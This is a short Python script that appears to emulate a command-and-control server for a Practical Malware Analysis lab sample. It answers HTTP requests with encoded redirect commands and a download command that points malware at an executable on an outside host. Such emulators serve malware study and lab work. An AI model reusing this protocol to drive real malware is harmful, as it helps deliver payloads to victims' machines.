COUNT = 0
DEFAULT_PATH = '/start.htm'
ALPHA_MAP = '/abcdefghijklmnopqrstuvwxyz0123456789:.'
INSTANCE_MAP = dict()


def HandleRequest(req, method, post_data=None):
    global COUNT 
    response = '<nope>'

    if method == 'GET':
        if req.path == DEFAULT_PATH:
            id = "/id" + str(COUNT)
            COUNT += 1
            response = MakeResponse('r', r'http://www.practicalmalwareanalysis.com' + id, encode=True)
            INSTANCE_MAP[id] = 0

        elif req.path in INSTANCE_MAP:
            response = MakeResponse('d', r'http://downloads.com/pixelpoker.exe', encode=True)

    req.send_response(200)
    req.send_header('Content-Length', len(response))
    req.end_headers()
    req.wfile.write(response)


def EncodeData(data):
    edata = ''
    for char in data:
        pos = ALPHA_MAP.find(char)
        if pos >= 0:
            edata += '{0:02}'.format(pos)
    return edata


def MakeResponse(type, data, encode=False):
    return '<noscript>http://www.practicalmalwareanalysis.com/{0}/{1}/96\'</noscript>'.format(type, EncodeData(data) if encode else data)
